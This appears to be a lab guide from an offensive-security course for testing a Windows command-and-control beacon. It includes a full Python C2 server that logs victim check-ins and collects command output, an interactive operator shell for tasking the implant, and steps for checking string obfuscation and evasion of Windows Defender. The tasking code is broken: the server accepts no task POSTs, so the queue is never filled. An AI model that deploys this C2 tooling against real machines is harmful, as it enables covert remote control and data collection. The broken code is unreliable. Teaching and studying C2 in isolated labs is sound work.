# Testing Guide - Final Beacon

## Overview

This guide walks through testing the final beacon implementation step-by-step.

## Prerequisites

- Windows machine (target)
- Python 3.x (for C2 server simulation)
- MSVC compiler (for building)
- Administrator privileges (optional, for some tests)

## Quick Start

### 1. Build the Beacon

```cmd
# Open Developer Command Prompt for VS
cd Week-12-Final-Beacon

# Build debug version (recommended for testing)
build.bat
> 1  (Debug build)
```

### 2. Start Test C2 Server

Create `test-server.py`:

```python
#!/usr/bin/env python3
"""
Simple C2 server for testing the beacon
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

# Task queue: beacon_id -> task
tasks = {}
# Results: beacon_id -> [results]
results = {}

class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        """Custom logging"""
        print(f"[{self.command}] {format % args}")

    def do_GET(self):
        """Handle GET requests (check-in, task retrieval)"""
        parsed = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed.query)

        # Check-in
        if parsed.path == '/beacon/checkin':
            beacon_id = query.get('id', ['unknown'])[0]
            print(f"\n[+] Beacon checked in: {beacon_id}")
            print(f"    Computer: {query.get('computer', ['?'])[0]}")
            print(f"    User: {query.get('user', ['?'])[0]}")
            print(f"    PID: {query.get('pid', ['?'])[0]}")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            return

        # Task retrieval
        if parsed.path == '/beacon/task':
            beacon_id = query.get('id', ['unknown'])[0]

            # Check if task exists
            task = tasks.get(beacon_id, 'none')

            print(f"\n[*] Task request from: {beacon_id}")
            print(f"    Sending: {task}")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(task.encode())

            # Clear task after sending
            if beacon_id in tasks:
                del tasks[beacon_id]
            return

        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        """Handle POST requests (results)"""
        parsed = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed.query)

        if parsed.path == '/beacon/result':
            beacon_id = query.get('id', ['unknown'])[0]

            # Read result data
            content_length = int(self.headers['Content-Length'])
            result_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')

            print(f"\n[+] Result from: {beacon_id}")
            print(f"    Length: {len(result_data)} bytes")
            print(f"    Output:")
            print("-" * 60)
            print(result_data)
            print("-" * 60)

            # Store result
            if beacon_id not in results:
                results[beacon_id] = []
            results[beacon_id].append(result_data)

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            return

        self.send_response(404)
        self.end_headers()

def run_server(port=8080):
    """Run the C2 server"""
    server_address = ('', port)
    httpd = HTTPServer(server_address, C2Handler)

    print("=" * 60)
    print("C2 Test Server")
    print("=" * 60)
    print(f"Listening on: http://localhost:{port}")
    print("\nAvailable commands:")
    print("  - Type commands in a separate terminal:")
    print("    python -c \"import requests; requests.post('http://localhost:8080/task', data='BEACON_ID:COMMAND')\"")
    print("\n  - Or use the interactive shell (see below)")
    print("\nPress Ctrl+C to stop")
    print("=" * 60)
    print()

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down server...")
        httpd.shutdown()

if __name__ == '__main__':
    import sys
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    run_server(port)
```

Run the server:

```bash
python test-server.py
```

### 3. Run the Beacon

In a separate terminal:

```cmd
final-beacon-debug.exe
```

Expected output:
```
[*] Final Beacon - C2 Implant
[*] Educational purposes only

[*] Beacon ID: DESKTOP-ABC_1234_567890
[*] C2: localhost:8080
[*] Sleep: 5000 ms
[*] Jitter: 30%

[*] Initial check-in: id=DESKTOP-ABC_1234_567890&computer=COMPUTER&user=USER&pid=1234
[*] Sleeping for 4723 ms
```

## Testing Scenarios

### Test 1: Basic Commands

```bash
# In Python REPL or script:
import requests

# Send whoami command
beacon_id = "DESKTOP-ABC_1234_567890"  # Use actual beacon ID
requests.post(f'http://localhost:8080/task?id={beacon_id}', data='whoami')

# Wait for beacon to execute and send result
# Check server output for result
```

### Test 2: Directory Listing

```python
requests.post(f'http://localhost:8080/task?id={beacon_id}', data='dir C:\\Windows')
```

### Test 3: Change Sleep/Jitter

```python
# Change sleep to 10 seconds
requests.post(f'http://localhost:8080/task?id={beacon_id}', data='sleep 10')

# Change jitter to 50%
requests.post(f'http://localhost:8080/task?id={beacon_id}', data='jitter 50')
```

### Test 4: Exit Beacon

```python
requests.post(f'http://localhost:8080/task?id={beacon_id}', data='exit')
```

## Interactive C2 Shell

For easier testing, create `c2-shell.py`:

```python
#!/usr/bin/env python3
"""
Interactive C2 shell for testing
"""

import requests
import sys

def main():
    if len(sys.argv) < 2:
        print("Usage: python c2-shell.py <beacon_id>")
        print("\nTo find beacon ID, check the beacon output or server logs")
        sys.exit(1)

    beacon_id = sys.argv[1]
    c2_url = "http://localhost:8080"

    print(f"[*] C2 Interactive Shell")
    print(f"[*] Beacon: {beacon_id}")
    print(f"[*] C2 URL: {c2_url}")
    print(f"\n[*] Type commands (or 'exit' to quit shell, 'kill' to exit beacon)")
    print("-" * 60)

    while True:
        try:
            cmd = input(f"C2 ({beacon_id[:20]})> ").strip()

            if not cmd:
                continue

            if cmd.lower() == 'exit':
                print("[*] Exiting shell")
                break

            if cmd.lower() == 'kill':
                cmd = 'exit'

            # Send task
            print(f"[*] Sending task: {cmd}")
            response = requests.post(
                f"{c2_url}/beacon/task?id={beacon_id}",
                data=cmd
            )

            if response.status_code == 200:
                print(f"[+] Task queued")
                print(f"[*] Waiting for result (check server logs)...")
            else:
                print(f"[!] Error: {response.status_code}")

        except KeyboardInterrupt:
            print("\n[*] Exiting shell")
            break
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == '__main__':
    main()
```

Usage:

```bash
# Terminal 1: Start server
python test-server.py

# Terminal 2: Run beacon
final-beacon-debug.exe

# Terminal 3: Interactive shell (get beacon_id from Terminal 2)
python c2-shell.py DESKTOP-ABC_1234_567890
```

## Verification Checklist

- [ ] Beacon starts and displays configuration
- [ ] Initial check-in reaches server
- [ ] Beacon retrieves tasks from server
- [ ] Commands execute successfully
- [ ] Output is captured and sent to server
- [ ] Sleep/jitter works as expected
- [ ] Exit command terminates beacon cleanly

## Troubleshooting

### Beacon doesn't start

- Check if firewall is blocking
- Verify localhost:8080 is accessible
- Try building debug version for error messages

### No tasks received

- Verify beacon ID matches exactly
- Check URL encoding in task requests
- Ensure server is running and accessible

### Commands don't execute

- Check for syntax errors in command
- Try simple commands first (whoami, hostname)
- Verify cmd.exe is accessible

### Output not sent

- Check server logs for POST requests
- Verify output buffer isn't overflowing
- Try commands with small output first

## Advanced Testing

### Network Testing

```bash
# Test over network (not localhost)
# 1. Modify beacon to use actual IP
# 2. Configure firewall
# 3. Run server on one machine, beacon on another
```

### Obfuscation Testing

```bash
# Verify strings are obfuscated
strings final-beacon.exe | grep -i "localhost"  # Should find nothing

# Verify in release build
strings final-beacon-minimal.exe
```

### Performance Testing

```bash
# Monitor resource usage
# Task Manager > Performance
# Check CPU, memory, network during beacon execution
```

## Next Steps

After successful testing:

1. Review server logs for patterns
2. Analyze network traffic with Wireshark
3. Test detection with Windows Defender
4. Implement additional features
5. Study real C2 frameworks (Cobalt Strike, Sliver, Havoc)

## Security Notes

**WARNING**: This is educational software.

- Only test in isolated lab environments
- Never deploy on production systems
- Understand legal implications
- Use responsibly and ethically

## Resources

- WinHTTP documentation: https://docs.microsoft.com/en-us/windows/win32/winhttp
- HTTP protocol: https://developer.mozilla.org/en-US/docs/Web/HTTP
- Python requests: https://docs.python-requests.org/
- Process creation: https://docs.microsoft.com/en-us/windows/win32/procthread/creating-processes
